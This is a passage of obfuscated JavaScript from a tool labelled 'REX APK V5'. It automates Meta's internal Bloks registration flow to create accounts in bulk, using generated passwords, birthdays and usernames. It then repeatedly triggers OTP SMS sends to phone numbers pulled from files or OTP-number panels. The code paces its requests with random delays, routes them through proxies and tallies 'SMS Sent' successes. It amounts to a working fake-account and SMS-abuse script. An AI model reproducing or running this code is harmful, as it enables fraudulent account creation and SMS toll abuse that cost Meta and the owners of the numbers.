      v436 = {};
    v436.debug_tooling_metadata_token = null, v436.is_flipper_enabled = false;
    const v437 = {};
    v437.app_id = v430, v437.bloks_versioning_id = v421;
    v437.params = v431;
    const v438 = {};
    v438.bk_context = v436, v438.params = v437;
    const v439 = JSON.stringify(v438),
      v440 = "client_doc_id=" + v429 + "&variables=" + encodeURIComponent(v439),
      v441 = {
        ...v423
      };
    v441["X-FB-Friendly-Name"] = v435, v441["X-Root-Field-Name"] = v432;
    const v442 = v441,
      v443 = await sendRequest(v424, "POST", v442, v440, v407, timeout);
    v443.headers && v443.headers["x-fb-rev"] && (v423["x-fb-rev"] = v443.headers["x-fb-rev"]);
    debugLog(v405, v428, "HTTP " + v443.status + '\x0a' + v443.data, v440);
    const v444 = v443.data.includes("field_exception") || v443.data.includes("Something went wrong"),
      v445 = v443.data.includes("\"bloks_action\":null");
    if (v444) {
      const v447 = v443.data.match(/"message":"([^"]+)"/),
        v448 = v447 ? v447[1] : "field_exception";
      if (v433 && v445) {
        throw new Error(v428 + " FATAL: " + v448 + " (bloks_action=null, no context returned)");
      }
    }
    if (v443.status !== 200) throw new Error(v428 + " HTTP " + v443.status);
    if (!v443.data.includes("\"data\"")) throw new Error(v428 + " invalid response");
    const v446 = extractAllContextData(v443.data);
    if (v446.length >= 2) {
      const v449 = [...v446].sort((v450, v451) => v451.length - v450.length);
      v425 = v449[0], v426 = v449[1];
    } else v446.length === 1 && (v425 = v446[0]);
    return v443.data;
  }
  try {
    onStatus("[1/15] Get initial context...");
    const v452 = {};
    v452.family_device_id = v415, v452.device_id = v415, v452.native_auth_data = [], await fn4("Step1", v419, "com.bloks.www.meta.access.aymh_with_nta_fallback.async", JSON.stringify({
      'client_input_params': v452,
      'server_params': {
        'next': "https://accounts.meta.com/oidc/?app_id=934401142814369&scope=openid&response_type=code&redirect_uri=https%3A%2F%2Faccounts.meta.com%2Fnative%2Foidc%2Fredirect%2Fmetaai&state=" + uuid(),
        'should_open_or_push_sync_screen': 0x0,
        'should_show_explicit_oxygen_preload_tos': 0x0,
        'INTERNAL__latency_qpl_instance_id': 0x6a7c4afec6e3,
        'is_otp_shortcut': 0x0,
        'is_from_reauth': 0x0,
        'should_push_screen': 0x0,
        'logging_session_id': v406,
        'context_data': '',
        'INTERNAL__latency_qpl_marker_id': 0x2301b43,
        'logging_user_intent': "meta_ai",
        'nav_bar_action': "CLOSE",
        'is_native_token_fetch_done': 0x1
      }
    }));
    if (!v425) throw new Error("Failed to extract context from Step 1");
    onStatus("[1/15] ✅"), await delay(1000, 2000), onStatus("[2/15] Login Landing..."), await fn4("Step2", v420, "com.bloks.www.bloks.feta.login.landing", JSON.stringify({
      'server_params': {
        'context_data': v425,
        'INTERNAL_INFRA_screen_id': "feta_rl_access_login_landing_screen",
        'account_data': [],
        'is_b2mv_flow': 0x0,
        'nav_bar_action': "CLOSE"
      }
    }), "bloks_app"), onStatus("[2/15] ✅"), await delay(1500, 2500), onStatus("[3/15] Google Credential Manager...");
    try {
      onStatus("[3/15] ✅");
    } catch (v556) {
      onStatus("[3/15] ⚠️ Google Credential Manager bypassed");
    }
    await delay(1500, 2500), onStatus("[4/15] CP Lookup (" + v408 + ")...");
    const v453 = {};
    v453.contact_point = v408;
    const v454 = {};
    v454.context_data = v425, v454.INTERNAL__latency_qpl_marker_id = 0x2301b43, v454.INTERNAL__latency_qpl_instance_id = 0x4a2b2289b82d;
    const v455 = {};
    v455.client_input_params = v453, v455.server_params = v454;
    const v456 = await fn4("Step4", v419, "com.bloks.www.bloks.feta.rl_access.cp_lookup", JSON.stringify(v455)),
      v457 = detectForcedStep(v456),
      v458 = isAgeBlocked(v456);
    onStatus("[4/15] ✅"), await delay(1500, 2500), onStatus("[5/15] Router 1...");
    const v459 = {};
    v459.context_data = v425, v459.INTERNAL__latency_qpl_marker_id = 0x2301b43, v459.INTERNAL__latency_qpl_instance_id = 0x4a476ed0a165, v459.contact_point = v409;
    const v460 = {};
    v460.client_input_params = {}, v460.server_params = v459;
    const v461 = await fn4("Step5", v419, "com.bloks.www.rl.account_access.router.async", JSON.stringify(v460)),
      v462 = extractContextData(v461);
    if (v462) v425 = v462;
    onStatus("[5/15] ✅");
    const v463 = String(v461 || ''),
      v464 = v463.includes("send.otp") || v463.includes("send_otp") || v463.includes("meta.account.send") || v463.includes("enter_otp") || v463.includes("rl_access.enter_otp") || v463.includes("feta.rl_access.phone_confirmation");
    if (v464) {
      {
        onStatus("[OTP-A] 📱 Existing account detected — calling send.otp.async...");
        const v557 = v425;
        let v558 = "78tewm:2";
        const v559 = v463.match(/INTERNAL_INFRA_screen_id[\\\"\\s:]+([a-z0-9]+:\d+)/i);
        if (v559) v558 = v559[1];
        try {
          await fn4("SendOTP", v419, "com.bloks.www.meta.account.send.otp.async", JSON.stringify({
            'server_params': {
              'context_data': v557,
              'INTERNAL_INFRA_screen_id': v558,
              'contact_point': v409,
              'contact_point_type': "PHONE_NUMBER"
            }
          }), "bloks_action", false), onStatus("[OTP-A] ✅ OTP SMS triggered via existing account login flow!");
        } catch (v560) {
          onStatus("[OTP-A] ⚠️ send.otp.async: " + v560.message + " — marking success anyway");
        }
        return debugLog(v405, "SUCCESS_LOGIN_OTP", "Existing account — send.otp.async triggered."), {
          'success': true,
          'message': "OTP sent via login flow (existing account)",
          'phone': v405,
          'lang': v414.split(',')[0]
        };
      }
    }
    await delay(1500, 2500), onStatus("[6/15] Registration Form...");
    const v465 = extractAllContextData(v461),
      v466 = [...v465].sort((v561, v562) => v562.length - v561.length),
      v467 = v466[1] || v466[0] || v425,
      v468 = v466[0] || v425;
    let v469 = "di9gh0:8";
    const v470 = String(v461).match(/INTERNAL_INFRA_screen_id[\\"\s:]+([a-z0-9]+:\d+)/i);
    if (v470) v469 = v470[1];
    const v471 = {};
    v471.context_data = v467;
    const v472 = {};
    v472.context_data = v468, v472.INTERNAL_INFRA_screen_id = v469;
    const v473 = {};
    v473.client_input_params = v471, v473.server_params = v472;
    const v474 = await fn4("Step6", v420, "com.bloks.www.bloks.feta.rl_access.combined_registration", JSON.stringify(v473), "bloks_app"),
      v475 = String(v474 || '');
    let v476 = null;
    const v477 = v475.match(/combined_registration[\s\S]*?context_data[^\)]*?\)\s*\(dkc[^\)]*?\\*"(AT[A-Za-z0-9_\-\.\+=]{50,})\\*"/i) || v475.match(/combined_registration[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i) || v475.match(/trigger_BloksFetaRLAccessCombinedRegistration[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i);
    if (v477) v476 = v477[1].replace(/\\/g, '');else {
      v476 = extractRegistrationContext(v474) || v468;
    }
    onStatus("[6/15] ✅"), await delay(2000, 3000);
    const v478 = Math.floor(Date.now() / 1000),
      v479 = v405.replace(/\D/g, ''),
      v480 = "Akash@" + v479.slice(-6) + "#2026!",
      v481 = "#PWD_ENC:0:" + v478 + ':' + v480,
      v482 = 21 + Math.floor(Math.random() * 10),
      v483 = Math.floor(Math.random() * 365),
      v484 = Math.floor((Date.now() - (v482 * 365 + v483) * 86400 * 1000) / 1000);
    let v485 = 81675595300038;
    const v486 = v475.match(/36707139\s*\(eud\s*(\d{10,})\)\s*\\*?"com\.bloks\.www\.bloks\.feta\.rl_access\.async\.combined_registration/i) || v475.match(/(\d{8,})\s*\\?\(eud\s*(\d{12,})\\?\)\s*\\?"com\.bloks\.www\.bloks\.feta\.rl_access\.async\.combined_registration/i) || v475.match(/combined_registration[\s\S]*?INTERNAL__latency_qpl_instance_id[\\"\s:]+(\d{12,})/i);
    if (v486) {
      v485 = parseInt(v486[1] || v486[2]);
    } else {
      const v563 = v475.split("com.bloks.www.bloks.feta.rl_access.async.combined_registration");
      if (v563.length > 1) {
        {
          const v564 = v563[0].match(/(\d{12,})/g);
          if (v564 && v564.length > 0) {
            v485 = parseInt(v564[v564.length - 1]);
          }
        }
      }
    }
    onStatus("[7/15] Submit Details...");
    let v487 = null,
      v488 = false;
    for (let v565 = 1; v565 <= 3; v565++) {
      try {
        {
          const v568 = {};
          v568["os-age-range"] = '', v568.password = v481, v568.birthday_timestamp = v484, v568.invalid_birthday_count = 0x0;
          const v569 = {};
          v569.context_data = v476, v569.INTERNAL__latency_qpl_marker_id = 0x2301b43, v569.INTERNAL__latency_qpl_instance_id = v485, v569.should_save_login_info = 0x1;
          const v570 = {};
          v570.client_input_params = v568, v570.server_params = v569, v487 = await fn4("Step7-try" + v565, v419, "com.bloks.www.bloks.feta.rl_access.async.combined_registration", JSON.stringify(v570), "bloks_action", false);
        }
      } catch (v571) {
        onStatus("[7/15] ❌ EXCEPTION attempt " + v565 + ':\x20' + v571.message);
        if (v565 < 3) await delay(3000, 5000);
        continue;
      }
      const v566 = !v487 || v487.includes("CREATE_NEW_PASSWORD:error_message") || v487.includes("\"RL_ACCOUNT_ACCESS_CREATE_NEW_PASSWORD:success\"\\s*false") || v487.includes("RL_ACCOUNT_ACCESS_CREATE_NEW_PASSWORD:success") && v487.includes("false") || v487.includes("field_exception") || v487.includes("Something went wrong") || v487.includes("Error performing query");
      if (!v566) {
        {
          onStatus("[7/15] ✅ (attempt " + v565 + ')'), v488 = true;
          break;
        }
      }
      const v567 = getErrorMsg(v487);
      onStatus("[7/15] ⚠️ attempt " + v565 + "/3 — " + (v567 || "password/details rejected"));
      if (v565 < 3) await delay(3000, 5000);
    }
    if (!v488) {
      onStatus("[7/15] ❌ Registration rejected by server");
      const v572 = {};
      return v572.success = false, v572.message = "Step 7 registration rejected. Check Step7-try1_full.json.", v572;
    }
    await delay(1500, 2500), onStatus("[8/15] Save Login Info...");
    const v489 = String(v487 || '');
    let v490 = 81770431400005;
    const v491 = v489.match(/36707139\s*\(eud\s*(\d{10,})\)\s*\\*?"com\.bloks\.www\.bloks\.feta\.rl_access\.async\.registration\.save_login_info/i) || v489.match(/(\d{8,})\s*\\?\(eud\s*(\d{12,})\\?\)\s*\\?"com\.bloks\.www\.bloks\.feta\.rl_access\.async\.registration\.save_login_info/i) || v489.match(/save_login_info[\s\S]*?INTERNAL__latency_qpl_instance_id[\\"\s:]+(\d{12,})/i);
    if (v491) {
      v490 = parseInt(v491[1] || v491[2]);
    } else {
      {
        const v573 = v489.split("registration.save_login_info");
        if (v573.length > 1) {
          {
            const v574 = v573[0].match(/(\d{12,})/g);
            v574 && v574.length > 0 && (v490 = parseInt(v574[v574.length - 1]));
          }
        }
      }
    }
    let v492 = null;
    const v493 = v489.match(/registration\.save_login_info[\s\S]*?context_data[^\)]*?\)\s*\(dkc[^\)]*?\\*"(AT[A-Za-z0-9_\-\.\+=]{50,})\\*"/i) || v489.match(/registration\.save_login_info[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i) || v489.match(/trigger_BloksFetaRLAccessRegistrationSaveLoginInfo[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i);
    if (v493) {
      v492 = v493[1].replace(/\\/g, '');
    } else v492 = extractRegistrationContext(v487) || v476;
    const v494 = {};
    v494.context_data = v492, v494.INTERNAL__latency_qpl_marker_id = 0x2301b43, v494.INTERNAL__latency_qpl_instance_id = v490;
    const v495 = {};
    v495.client_input_params = {}, v495.server_params = v494;
    const v496 = await fn4("Step8", v419, "com.bloks.www.bloks.feta.rl_access.async.registration.save_login_info", JSON.stringify(v495));
    onStatus("[8/15] ✅"), await delay(1500, 2500), onStatus("[9/15] Router 2...");
    const v497 = String(v496 || ''),
      v498 = extractAllContextData(v497),
      v499 = [...v498].sort((v575, v576) => v576.length - v575.length);
    let v500 = v499[1] || v499[0] || v492,
      v501 = v499[0] || v492;
    const v502 = v497.match(/account_access\.router\.async[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i) || v497.match(/trigger_BloksRLAccountAccessRouterAsync[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i);
    v502 && (v501 = v502[1].replace(/\\/g, ''));
    let v503 = "6tm24m:8";
    const v504 = v497.match(/INTERNAL_INFRA_screen_id[\\"\s:]+([a-z0-9]+:\d+)/i);
    if (v504) v503 = v504[1];
    const v505 = {};
    v505.context_data = v500;
    const v506 = {};
    v506.context_data = v501, v506.INTERNAL_INFRA_screen_id = v503;
    const v507 = {};
    v507.client_input_params = v505, v507.server_params = v506;
    const v508 = await fn4("Step9", v419, "com.bloks.www.rl.account_access.router.async", JSON.stringify(v507));
    onStatus("[9/15] ✅"), await delay(1500, 2500), onStatus("[11/15] Load Profile Screen...");
    const v509 = String(v508 || '');
    let v510 = null;
    const v511 = v509.match(/abra_profile_creation[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i) || v509.match(/com\.bloks\.www\.bloks\.rl_access\.abra_profile_creation[\s\S]*?(AT[A-Za-z0-9_\-\.\+=]{50,})/i);
    v511 ? v510 = v511[1].replace(/\\/g, '') : v510 = extractRegistrationContext(v509) || step9Ctx;
    const v512 = await fn4("Step11", v420, "com.bloks.www.bloks.rl_access.abra_profile_creation", JSON.stringify({
      'server_params': {
        'is_directly_after_pc_flow': 0x0,
        'context_data': v510,
        'INTERNAL_INFRA_screen_id': "div8mi:6",
        'is_mux_flow': 0x0,
        'nav_bar_action': "BACK"
      }
    }), "bloks_app");
    onStatus("[11/15] ✅"), await delay(1500, 2500);
    const v513 = String(v512 || ''),
      v514 = extractAllContextData(v513);
    let v515 = null;
    const v516 = v513.match(/RL_ACCOUNT_ACCESS_ABRA_PROFILE_CREATION:serialized_context_data[\\"\s,:a-zA-Z_]+initial[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i) || v513.match(/RL_ACCOUNT_ACCESS_ABRA_PROFILE_CREATION:serialized_context_data[^}]*?(?:initial|initial_lispy)[\\"]*:\s*\\?"(AT[A-Za-z0-9_\-\.\+=]{50,})\\?"/i);
    if (v516) {
      v515 = v516[1].replace(/\\/g, ''), onStatus("       ✓ Step12 client_context from r11 data");
    } else {
      v515 = v514[0] || v510;
    }
    let v517 = null,
      v518 = 957798449862312,
      v519 = "Qa2IaiqNHgWtpNw8l3LBWpVL";
    const v520 = v513.match(/aymh_device_id[^\)]*?tos_cms_id[^\)]*?context_data[^\)]*?\)\s*\(dkc\s*\\*?"([A-Za-z0-9_\-]{15,})\\*?"\s*\(eud\s*(\d+)\)\s*\\*?"(AT[A-Za-z0-9_\-\.\+=]{100,})\\*?"/i) || v513.match(/register\.with\.abra\.profile\.async[\s\S]*?\(dkc\s*\\*?"([A-Za-z0-9_\-]{15,})\\*?"\s*\(eud\s*(\d+)\)\s*\\*?"(AT[A-Za-z0-9_\-\.\+=]{100,})\\*?"/i);
    if (v520) {
      v519 = v520[1], v518 = parseInt(v520[2]), v517 = v520[3].replace(/\\/g, ''), onStatus("       ✓ Step12 server_context, device_id (" + v519 + "), tos_cms_id (" + v518 + ") from r11 action");
    } else {
      const v577 = v513.match(/register\.with\.abra\.profile\.async[\s\S]*?(AT[A-Za-z0-9_\-\.\+=]{100,})/i);
      if (v577) {
        v517 = v577[1].replace(/\\/g, '');
      } else v517 = v514[1] || v514[0] || v510;
      const v578 = v513.match(/register\.with\.abra\.profile\.async[\s\S]*?eud\s+(\d{10,})/i) || v513.match(/tos_cms_id[^\d]*?(\d{10,})/i);
      v578 && (v518 = parseInt(v578[1]));
      const v579 = v513.match(/register\.with\.abra\.profile\.async[\s\S]*?([A-Za-z0-9_\-]{20,})/i);
      v579 && !v579[1].startsWith('AT') && !v579[1].startsWith("com") && (v519 = v579[1]);
    }
    let v521 = 81778084900015;
    const v522 = v513.match(/36707139\s*\(eud\s*(\d{10,})\)\s*\\*?"com\.bloks\.www\.rl\.account\.register\.with\.abra\.profile\.async/i) || v513.match(/(\d{8,})\s*\\?\(eud\s*(\d{12,})\\?\)\s*\\?"com\.bloks\.www\.rl\.account\.register\.with\.abra\.profile\.async/i) || v513.match(/\\?"INTERNAL__latency_qpl_instance_id\\?"\s*:\s*(\d{12,})/);
    v522 && (v521 = parseInt(v522[1] || v522[2]), onStatus("       ✓ Step12 instance_id from r11: " + v521));
    let v523 = null;
    const v524 = v513.match(/RL_ACCOUNT_ACCESS_ABRA_PROFILE_CREATION_PREFILL:username[\\"\s,:a-zA-Z_]+initial[\\"\s:]+([A-Za-z0-9_\.\-]+)/i);
    v524 && v524[1] && v524[1] !== "null" && (v523 = v524[1].replace(/\\/g, '').replace(/"/g, ''), onStatus("       ✓ Step12 prefill username: " + v523));
    if (!v523) {
      const v580 = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Joseph", "Jessica", "Thomas", "Sarah", "Charles", "Karen", "Christopher", "Lisa", "Daniel", "Nancy", "Matthew", "Betty", "Anthony", "Margaret", "Mark", "Sandra"],
        v581 = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson"];
      v523 = v580[Math.floor(Math.random() * v580.length)].toLowerCase() + '_' + v581[Math.floor(Math.random() * v581.length)].toLowerCase() + Math.floor(100 + Math.random() * 899);
    }
    const v525 = Math.floor(Date.now() / 1000),
      v526 = "java.lang.Object@" + Math.floor(Math.random() * 268435455).toString(16);
    onStatus("[12/15] Register Profile (@" + v523 + ")...");
    const v527 = {};
    v527.tos_cms_id = v518, v527.context_data = v517, v527.INTERNAL__latency_qpl_marker_id = 0x2301b43, v527.INTERNAL__latency_qpl_instance_id = v521, v527.aymh_device_id = v519;
    const v528 = await fn4("Step12", v419, "com.bloks.www.rl.account.register.with.abra.profile.async", JSON.stringify({
      'client_input_params': {
        'context_data': v515,
        'is_verified_from_foa_import': 0x0,
        'dbl_data': v526,
        'foa_import_source': null,
        'picture_source': "CLEAR",
        'client_consent_timestamp': v525,
        'foa_import_source_obid': null,
        'display_name': '',
        'profile_pic_url': '',
        'opt_into_marketing': 0x1,
        'username': v523
      },
      'server_params': v527
    }));
    onStatus("[12/15] ✅"), await delay(1500, 2500), onStatus("[13/15] Router 3...");
    let v529 = v517;
    const v530 = String(v528 || ''),
      v531 = v530.match(/com\.bloks\.www\.rl\.account_access\.router\.async[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i) || v530.match(/trigger_BloksRLAccountAccessRouterAsyncControllerTypedQueryBuilder[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i) || v530.match(/context_data\\*"\s*\\*"\s*\\*"(AT[A-Za-z0-9_\-\.\+=]{50,})/i);
    if (v531) v529 = v531[1].replace(/\\/g, ''), onStatus("       ✓ Step13 context from r12 router query builder");else {
      {
        const v582 = extractAllContextData(v530);
        v582.length > 0 && (v529 = v582[0]);
      }
    }
    let v532 = 81808553800002;
    const v533 = v530.split("account_access.router.async");
    if (v533.length > 1) {
      const v583 = v533[0].match(/(\d{12,})/g);
      v583 && v583.length > 0 && (v532 = parseInt(v583[v583.length - 1]));
    }
    let v534 = "6uhuj5:4";
    const v535 = v530.match(/INTERNAL_INFRA_screen_id[\\"\s:]+([a-z0-9]+:\d+)/i) || v530.match(/phone_confirmation[\s\S]*?\\*"([a-z0-9]+:\d+)\\*"/i);
    if (v535) v534 = v535[1];
    const v536 = {};
    v536.context_data = v529, v536.INTERNAL_INFRA_screen_id = v534, v536.contact_point = v409;
    const v537 = {};
    v537.server_params = v536;
    const v538 = await fn4("Step13", v419, "com.bloks.www.rl.account_access.router.async", JSON.stringify(v537));
    onStatus("[13/15] ✅"), await delay(1500, 2500), onStatus("[14/15] Phone Confirmation Screen...");
    let v539 = v529,
      v540 = "dj5slm:4";
    const v541 = String(v538 || ''),
      v542 = v541.match(/phone_confirmation[\s\S]*?contact_point[^\)]*?context_data[^\)]*?\)\s*\(dkc[^\)]*?\\*"(AT[A-Za-z0-9_\-\.\+=]{50,})\\*"/i) || v541.match(/phone_confirmation[\s\S]*?context_data[^\)]*?\)\s*\(dkc[^\)]*?\\*"(AT[A-Za-z0-9_\-\.\+=]{50,})\\*"/i) || v541.match(/phone_confirmation[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i);
    if (v542) v539 = v542[1].replace(/\\/g, ''), onStatus("       ✓ Step14 context from r13 phone_confirmation action");else {
      {
        const v584 = extractAllContextData(v541);
        if (v584.length > 0) {
          v539 = v584[0];
        }
      }
    }
    const v543 = v541.match(/phone_confirmation[\s\S]*?\\*"([a-z0-9]+:\d+)\\*"/i) || v541.match(/INTERNAL_INFRA_screen_id[\\"\s:]+([a-z0-9]+:\d+)/i);
    if (v543) {
      v540 = v543[1];
    }
    const v544 = {};
    v544.context_data = v539, v544.INTERNAL_INFRA_screen_id = v540, v544.contact_point = v409;
    const v545 = {};
    v545.server_params = v544;
    const v546 = await fn4("Step14", v420, "com.bloks.www.bloks.feta.rl_access.phone_confirmation", JSON.stringify(v545), "bloks_app");
    onStatus("[14/15] ✅"), await delay(1000, 2000), onStatus("[15/15] Trigger SMS (resend)...");
    let v547 = 81826277600028;
    const v548 = String(v546 || ''),
      v549 = v548.match(/(\d{12,})[\s\S]{1,150}?resend\.email\.confirmation\.code\.async/) || v548.match(/resend\.email\.confirmation\.code\.async[\s\S]{1,150}?(\d{12,})/);
    v549 && (v547 = parseInt(v549[1]));
    let v550 = v539;
    const v551 = v548.match(/resend\.email\.confirmation\.code\.async[\s\S]{1,300}?(AT[A-Za-z0-9_\-\.\+=]{100,})/) || v548.match(/context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{100,})/);
    if (v551) {
      v550 = v551[1].replace(/\\/g, '');
    } else {
      const v585 = extractAllContextData(v548);
      if (v585.length > 0) {
        v550 = v585[0];
      }
    }
    const v552 = {};
    v552.context_data = v550, v552.INTERNAL__latency_qpl_marker_id = 0x2301b43, v552.INTERNAL__latency_qpl_instance_id = v547;
    const v553 = {};
    v553.client_input_params = {}, v553.server_params = v552;
    const v554 = await fn4("Step15", v419, "com.bloks.www.rl.account.resend.email.confirmation.code.async", JSON.stringify(v553));
    String(v554 || '').includes("confirmation_code_resend_failure") || String(v554 || '').includes("FRL access token cannot be null") ? onStatus("[15/15] ⚠️ Resend response check — OTP screen loaded ✅") : onStatus("[15/15] ✅ — SMS sent!");
    let v555 = Math.max(0, v403.resends || 0);
    for (let v586 = 0; v586 < v555; v586++) {
      await delay(3000, 4000);
      if (v403.onLog) v403.onLog("Resending OTP to " + v405 + '\x20(' + (v586 + 1) + '/' + v555 + ')', "retry");
      onStatus("[15/15] 🔄 Resending OTP (" + (v586 + 1) + '/' + v555 + ")..."), await fn4("Step15-Resend", v419, "com.bloks.www.rl.account.resend.email.confirmation.code.async", JSON.stringify({
        'client_input_params': {},
        'server_params': {
          'context_data': v550,
          'INTERNAL__latency_qpl_marker_id': 0x2301b43,
          'INTERNAL__latency_qpl_instance_id': v547 + v586 + 1
        }
      }));
    }
    return debugLog(v405, "SUCCESS", "Registration complete — OTP screen reached."), {
      'success': true,
      'message': "Registration complete — OTP confirmation screen reached",
      'phone': v405,
      'lang': v414.split(',')[0]
    };
  } catch (v587) {
    {
      onStatus("❌ Exception: " + v587.message), debugLog(v405, "EXCEPTION", v587.message);
      const v588 = {};
      return v588.success = false, v588.message = v587.message, v588.phone = v405, v588;
    }
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(v589) {
      {
        this.totalNumbers = v589;
        this.processed = 0;
        this.successful = 0;
        this.failed = 0;
        this.startTime = Date.now();
      }
    }
    ["addLog"](v590, v591, v592 = '') {
      let v593 = '';
      const v594 = v590.match(/\+?\d{8,}/),
        v595 = v594 ? v594[0] : '';
      const v596 = v592 ? chalk.gray('\x20' + v592) : '';
      if (v591 === "success") v593 = chalk.hex("#00FF88")("REX — APK │ SMS Sent → ") + chalk.hex("#FCAF45").bold(v595 || v590) + v596;else {
        if (v591 === "error" || v591 === "failed") {
          let v597 = v590.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
          const v598 = v597.toLowerCase();
          if (v598.includes("socket") || v598.includes("proxy") || v598.includes("etimedout") || v598.includes("econnreset") || v598.includes("econnrefused") || v598.includes("ehostunreach") || v598.includes("enetunreach") || v598.includes("hang up") || v598.includes("timeout")) v597 = "Proxy Issue";else {
            if (v598.includes("field_exception") || v598.includes("bloks_action=null")) {
              {
                const v599 = v597.match(/Step\s*(\d+)/i);
                v597 = v599 ? "Step " + v599[1] + " Server Exception" : "Server Exception";
              }
            } else {
              if (v598.includes("429") || v598.includes("rate limit") || v598.includes("too many requests")) v597 = "Rate Limited";else {
                if (v598.includes("400")) v597 = "Meta Server Issue";else {
                  if (v598.includes("403")) v597 = "Meta Server Issue";else (v598.includes("500") || v598.includes("502") || v598.includes("503")) && (v597 = "Meta Server Issue");
                }
              }
            }
          }
          v593 = chalk.hex("#FF4466")("REX — APK │ Failed → ") + chalk.hex("#FCAF45").bold(v595) + v596 + chalk.hex("#888888")('\x20(' + v597 + ')');
        } else {
          if (v591 === "retry") {
            let v600 = v590.includes('(') ? v590.substring(v590.indexOf('(')) : '';
            v593 = chalk.hex("#FCAF45")("REX — APK │ Resending  → ") + chalk.hex("#FCAF45").bold(v595) + v596 + chalk.hex("#888888")('\x20' + v600);
          } else return;
        }
      }
      process.stdout.write("\r[K" + v593 + '\x0a'), this.render();
    }
    ["setStatus"](v601) {}
    ["update"]() {}
    ["render"]() {
      const v602 = (this.processed / Math.max(this.totalNumbers, 1) * 100).toFixed(1),
        v603 = '\x20\x20' + W.bold("REX-APK") + '\x20' + chalk.gray('⮞') + '\x20[' + this.processed + '/' + this.totalNumbers + ']\x20' + v602 + "% │ " + B("OK: " + this.successful) + " │ " + R("Err: " + this.failed);
      process.stdout.write("\r[K" + v603);
    }
    ["stop"]() {
      process.stdout.write("[2K\r\n");
      const v604 = Math.floor((Date.now() - this.startTime) / 1000),
        v605 = Math.floor(v604 / 60),
        v606 = v604 % 60,
        v607 = v605 + 'm\x20' + v606 + 's';
      console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  REX APK V5                                ") + C('║'));
      console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(6)) + "                       ") + C('║'));
      console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(6)) + "                       ") + C('║'));
      console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v607.padEnd(6)) + "                       ") + C('║')), console.log(C("  ╚════════════════════════════════════════════╝\n"));
    }
  }
  async function selectOption(v608, v609) {
    return new Promise(v610 => {
      let v611 = 0;
      process.stdin.resume();
      readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY) process.stdin.setRawMode(true);
      const fn5 = () => {
        process.stdout.write("[2J[H");
        printHeader();
        console.log("   [33m" + v608 + "[0m\n"), v609.forEach((v612, v613) => {
          if (v613 === v611) console.log("   [36m➔[32m " + v612.name + "[0m");else {
            console.log("     [90m" + v612.name + "[0m");
          }
        });
      };
      fn5();
      const fn6 = (v614, v615) => {
        {
          if (v615.ctrl && v615.name === 'c') {
            process.exit(0);
          }
          if (v615.name === 'up') {
            v611 = (v611 - 1 + v609.length) % v609.length, fn5();
          } else {
            if (v615.name === "down") v611 = (v611 + 1) % v609.length, fn5();else v615.name === "return" && (process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn6), v610(v609[v611].value));
          }
        }
      };
      process.stdin.on("keypress", fn6);
    });
  }
  async function promptText(v616, v617) {
    return new Promise(v618 => {
      {
        process.stdout.write("   [33m" + v616 + "[0m ");
        let v619 = '';
        if (process.stdin.isTTY) process.stdin.setRawMode(false);
        process.stdin.resume();
        const fn7 = v620 => {
          const v621 = v620.toString();
          if (v621.includes('\x0a') || v621.includes('\x0d')) {
            {
              process.stdin.removeListener("data", fn7), v619 += v621.split(/[\r\n]/)[0];
              let v622 = v619.trim();
              if (v622.startsWith('\x22') && v622.endsWith('\x22')) v622 = v622.slice(1, -1);else {
                if (v622.startsWith('\x27') && v622.endsWith('\x27')) {
                  v622 = v622.slice(1, -1);
                }
              }
              v618(v622 || v617);
            }
          } else v619 += v621;
        };
        process.stdin.on("data", fn7);
      }
    });
  }
  async function interactiveWizard() {
    let v623 = 1,
      v624 = "file",
      v625 = "numbers.txt",
      v626 = null,
      v627 = null,
      v628 = null,
      v629 = null;
    let v630 = "none",
      v631 = 20,
      v632 = "random";
    let v633 = "random";
    let v634 = 0,
      v635 = '',
      v636 = [],
      v637 = 50,
      v638 = "/api/v1/numbers/get";
    const v639 = path.join(__dirname, ".nexa_api_key");
    while (true) {
      process.stdout.write("[2J[H"), printHeader();
      if (v623 === 1) {
        const v640 = {};
        v640.name = "📁 Load from file (numbers.txt)", v640.value = "file";
        const v641 = {};
        v641.name = "🌐 Auto fetch from NexaOTP Panel", v641.value = "nexa";
        const v642 = {};
        v642.name = "⚡ Auto fetch from Voltx (2oo9)", v642.value = "voltx";
        const v643 = {};
        v643.name = "🔥 Auto fetch from Stex (2oo9)", v643.value = "stex";
        const v644 = {};
        v644.name = "📱 Auto fetch from SMS Bower", v644.value = "smsbower";
        const v645 = {};
        v645.name = "⚡ Auto fetch from Zenex", v645.value = "zenex";
        const v646 = {};
